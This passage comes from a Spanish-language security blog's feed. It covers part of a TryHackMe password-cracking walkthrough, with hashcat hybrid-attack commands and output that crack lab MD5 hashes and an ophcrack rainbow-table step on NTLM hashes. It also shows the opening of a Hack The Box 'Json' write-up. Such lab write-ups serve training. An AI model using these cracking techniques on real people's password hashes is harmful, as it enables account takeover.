&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sckull@uplifted:~/tools/hashcat$ ./hashcat64.bin -a &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; -m &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; hash.txt us-city-color.txt ?d?d?d
hashcat &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;v5.1.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; starting...

* Device &lt;span class=&#34;c1&#34;&gt;#1: WARNING! Kernel exec timeout is not disabled.&lt;/span&gt;
             This may cause &lt;span class=&#34;s2&#34;&gt;&amp;#34;CL_OUT_OF_RESOURCES&amp;#34;&lt;/span&gt; or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
nvmlDeviceGetFanSpeed&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;: Not Supported

OpenCL Platform &lt;span class=&#34;c1&#34;&gt;#1: NVIDIA Corporation&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;======================================&lt;/span&gt;
* Device &lt;span class=&#34;c1&#34;&gt;#1: GeForce MX130, 501/2004 MB allocatable, 3MCU&lt;/span&gt;

Hashes: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; digests&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; unique digests, &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; unique salts
Bitmaps: &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; bits, &lt;span class=&#34;m&#34;&gt;65536&lt;/span&gt; entries, 0x0000ffff mask, &lt;span class=&#34;m&#34;&gt;262144&lt;/span&gt; bytes, 5/13 rotates

Applicable optimizers:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

Minimum password length supported by kernel: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
Maximum password length supported by kernel: &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt;

ATTENTION! Pure &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;unoptimized&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; OpenCL kernels selected.
This enables cracking passwords and salts &amp;gt; length &lt;span class=&#34;m&#34;&gt;32&lt;/span&gt; but &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Temperature abort trigger &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; to 90c

Dictionary cache built:
* Filename..: us-city-color.txt
* Passwords.: &lt;span class=&#34;m&#34;&gt;50275&lt;/span&gt;
* Bytes.....: &lt;span class=&#34;m&#34;&gt;740916&lt;/span&gt;
* Keyspace..: &lt;span class=&#34;m&#34;&gt;50275000&lt;/span&gt;
* Runtime...: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.  

fbd527693aceda78b30a978d7d3b9abb:phoe&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;rple585
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
Hash.Target......: fbd527693aceda78b30a978d7d3b9abb
Time.Started.....: Tue Feb &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:58:05 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Time.Estimated...: Tue Feb &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:58:05 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Guess.Base.......: File &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;us-city-color.txt&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, Left Side
Guess.Mod........: Mask &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;?d?d?d&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;3&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;, Right Side
Guess.Queue.Base.: 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Guess.Queue.Mod..: 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Speed.#1.........:   473.0 MH/s &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;5.50ms&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; @ Accel:128 Loops:62 Thr:256 Vec:1
Recovered........: 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Digests, 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Salts
Progress.........: 24936400/50275000 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;49.60%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Rejected.........: 0/24936400 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Restore.Point....: 0/50275 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Restore.Sub.#1...: Salt:0 Amplifier:434-496 Iteration:0-62
Candidates.#1....: alabamared925 -&amp;gt; worlandgrey405
Hardware.Mon.#1..: Temp: 49c Util: 56% Core:1189MHz Mem:2505MHz Bus:4

Started: Tue Feb &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:58:02 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
Stopped: Tue Feb &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 20:58:06 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
sckull@uplifted:~/tools/hashcat$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;md5-3-1&#34;&gt;MD5 #3&lt;/h3&gt;
&lt;p&gt;Reto:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;a simple color followed by a country, followed by 4 digits (all lowercase).
a4131ef4610be60c0c6a3656b00dd763
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Combinator:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./combinator.bin ../../color.txt ../../country.txt &amp;gt; ../../color-country.txt
&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sckull@uplifted:~/tools/hashcat$ ./hashcat64.bin -a &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; -m &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; hash.txt color-country.txt ?d?d?d?d
hashcat &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;v5.1.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; starting...

* Device &lt;span class=&#34;c1&#34;&gt;#1: WARNING! Kernel exec timeout is not disabled.&lt;/span&gt;
             This may cause &lt;span class=&#34;s2&#34;&gt;&amp;#34;CL_OUT_OF_RESOURCES&amp;#34;&lt;/span&gt; or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
nvmlDeviceGetFanSpeed&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;: Not Supported

OpenCL Platform &lt;span class=&#34;c1&#34;&gt;#1: NVIDIA Corporation&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;======================================&lt;/span&gt;
* Device &lt;span class=&#34;c1&#34;&gt;#1: GeForce MX130, 501/2004 MB allocatable, 3MCU&lt;/span&gt;

Hashes: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; digests&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; unique digests, &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; unique salts
Bitmaps: &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; bits, &lt;span class=&#34;m&#34;&gt;65536&lt;/span&gt; entries, 0x0000ffff mask, &lt;span class=&#34;m&#34;&gt;262144&lt;/span&gt; bytes, 5/13 rotates

Applicable optimizers:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

Minimum password length supported by kernel: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
Maximum password length supported by kernel: &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt;

ATTENTION! Pure &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;unoptimized&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; OpenCL kernels selected.
This enables cracking passwords and salts &amp;gt; length &lt;span class=&#34;m&#34;&gt;32&lt;/span&gt; but &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Temperature abort trigger &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; to 90c

Dictionary cache built:
* Filename..: color-country.txt
* Passwords.: &lt;span class=&#34;m&#34;&gt;4775&lt;/span&gt;
* Bytes.....: &lt;span class=&#34;m&#34;&gt;66846&lt;/span&gt;
* Keyspace..: &lt;span class=&#34;m&#34;&gt;47750000&lt;/span&gt;
* Runtime...: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.  

a4131ef4610be60c0c6a3656b00dd763:blue&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;7926&lt;/span&gt; 
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
Hash.Target......: a4131ef4610be60c0c6a3656b00dd763
Time.Started.....: Tue Feb &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 21:00:36 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Time.Estimated...: Tue Feb &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 21:00:36 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Guess.Base.......: File &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;color-country.txt&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, Left Side
Guess.Mod........: Mask &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;?d?d?d?d&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;4&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;, Right Side
Guess.Queue.Base.: 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Guess.Queue.Mod..: 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Speed.#1.........:   355.7 MH/s &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.63ms&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; @ Accel:128 Loops:64 Thr:256 Vec:1
Recovered........: 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Digests, 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Salts
Progress.........: 35755200/47750000 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;74.88%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Rejected.........: 0/35755200 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Restore.Point....: 0/4775 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Restore.Sub.#1...: Salt:0 Amplifier:7424-7488 Iteration:0-64
Candidates.#1....: redafghanistan9147 -&amp;gt; greyzimbabwe8479
Hardware.Mon.#1..: Temp: 55c Util: 87% Core:1189MHz Mem:2505MHz Bus:4

Started: Tue Feb &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 21:00:33 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
Stopped: Tue Feb &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 21:00:37 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
sckull@uplifted:~/tools/hashcat$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;rainbow-table-ntlm&#34;&gt;Rainbow Table (NTLM)&lt;/h2&gt;
&lt;p&gt;En esta seccion utilizaremos ophcrack para poder cracker los hashes utilizando un rainbow table. Ophcrack viene incluido en el sistema de Kali Linux, por lo que debemos de descargar unicamente  el rainbow table &lt;code&gt;XP special&lt;/code&gt; (8GB).&lt;/p&gt;
&lt;p&gt;Retos:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;FF6EDF5C42F0FE57AAD5360A07991BD6:A2F77301E3162DB9213E3DA35D5EA931
1CDEE68485E23D0E1DD9CED345A47D0C:D4F3A9ACC8448BC9EF7C53B3BBBEC9C3
8C7972A6362411C1B0D3662B97EBED58:DAE91036E4B2E7F0B5061956BCE39A3E
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Importamos los hashes a ophrack y esperamos el resultado:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/passwordcracking/Screenshot_20200220_011917.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/passwordcracking/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/passwordcracking/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>challenge</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Json</title>
        <link>https://sckull.github.io/posts/json/</link>
        <pubDate>Sat, 15 Feb 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 15 Feb 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/json/</guid>
        <description>Json es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Json es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/json/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th&gt;Json&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;OS&lt;/td&gt;
&lt;td&gt;Linux&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;30&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;IP&lt;/td&gt;
&lt;td&gt;10.10.10.158&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/61047&#34;&gt;Cyb3rb0b&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puerto tcp/udp, en el cual nos muestra varios puertos abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
